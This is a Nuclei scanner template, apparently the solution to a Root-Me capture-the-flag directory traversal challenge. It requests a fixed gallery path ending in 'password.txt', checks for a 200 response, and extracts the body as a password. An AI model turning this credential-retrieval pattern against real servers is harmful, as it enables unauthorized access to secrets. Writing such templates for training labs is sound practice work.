id: Directorytraversal

info:
  name: Directory traversal
  author: Tomitom13
  severity: unknown
  tags: directory-traversal,rootme

requests:
  - method: GET
    path:
      - "{{BaseURL}}/galerie/86hwnX2r/password.txt"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        regex:
          - "[a-zA-Z0-9!@#$%^&*()_+,.<>?]+"
        part: body

    extractors:
      - type: regex
        name: password
        part: body
        regex:
          - "[a-zA-Z0-9!@#$%^&*()_+,.<>?]+"
